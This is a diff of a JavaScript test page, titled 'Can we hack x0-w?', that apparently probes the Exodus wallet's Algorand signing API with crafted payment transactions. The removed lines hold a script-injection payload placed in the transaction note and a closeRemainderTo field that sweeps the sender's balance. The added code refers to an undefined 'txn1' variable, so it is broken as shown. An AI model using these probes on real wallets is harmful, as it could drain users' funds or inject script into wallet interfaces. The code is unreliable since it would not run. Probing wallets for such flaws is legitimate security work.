@@ -59,31 +59,42 @@
                 
                 const receiver = "KUARVTRTHI5CNBLLWJ2MXFCJECD34HXZJHWNC2NWEOXUSTRKKMRUYKFBOM";
                 
-                let amount = 1000000; // equals 1 ALGO
+                let amount = 500000; // equals 0.5 ALGO
                 let sender = "RN6KHCDQEH4VONJWXQ4QULCAX5R2NM2DFDCVYTU3ZTKGFUQGFS5NTPTHJY";
 
                 const enc = new TextEncoder();
-                const note = enc.encode("<script>alert(1)<\/script>");
+                const note = enc.encode("hi");
 
-                let closeRemainderTo = "KUARVTRTHI5CNBLLWJ2MXFCJECD34HXZJHWNC2NWEOXUSTRKKMRUYKFBOM";
+                //let closeRemainderTo = "KUARVTRTHI5CNBLLWJ2MXFCJECD34HXZJHWNC2NWEOXUSTRKKMRUYKFBOM";
 
                 let txn = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
                     suggestedParams,
                     from: sender,
                     to: receiver,
                     amount: amount,
-                    note: note,
-                    closeRemainderTo: closeRemainderTo
+                    note: note
                 });
 
-                console.log("[*] txn: ");
-                console.log(txn);
+                console.log("[*] txn1: ");
+                console.log(txn1);
+
+                let txn2 = algosdk.makePaymentTxnWithSuggestedParamsFromObject({
+                    suggestedParams,
+                    from: sender,
+                    to: receiver,
+                    amount: amount,
+                    note: note
+                });
+
+                console.log("[*] txn2: ");
+                console.log(txn2);
 
                 const result = await window.exodus.algorand.connect();
                 console.log({result});
 
                 const tmp = await window.exodus.algorand.signAndSendTransaction([
-                    txn.toByte(),
+                    txn1.toByte(),
+                    txn2.toByte(),
                 ]);
                 console.log({tmp});
                 const { signedTransactions } = tmp;
@@ -264,7 +275,7 @@
 
         <div style="margin-top:30%;padding: 6px;width:50%;background-color:#000;color:#0E0;border:7px groove #AAD">
         <h1 style="color:#0Ad;text-shadow: 2px 2px 4px #FF6;">
-        60
+        61
         </h1>
         <h2>Can we hack x0-w?</h2>
         
